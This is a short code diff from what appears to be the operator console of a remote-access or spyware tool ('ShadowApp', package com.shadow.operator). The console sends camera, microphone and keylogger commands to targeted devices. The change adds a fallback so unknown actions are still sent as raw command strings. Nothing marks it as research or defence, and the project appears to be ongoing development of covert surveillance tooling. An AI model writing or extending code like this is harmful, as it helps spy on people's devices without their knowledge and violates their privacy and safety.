@@ -106,7 +106,12 @@ fun ShadowApp(repository: Repository) {
                         "MODULES" -> navController.navigate("modules/$id")
                         else -> {
                             // Instant actions (Cam, Mic, Keylog)
-                            repository.sendCommand(id, com.shadow.operator.data.Command.CommandType.valueOf(action), "{}")
+                            try {
+                                repository.sendCommand(id, com.shadow.operator.data.Command.CommandType.valueOf(action), "{}")
+                            } catch (e: IllegalArgumentException) {
+                                // Fallback to raw string if enum is missing
+                                repository.sendCommandRaw(id, action.lowercase(), "{}")
+                            }
                         }
                     }
                 }
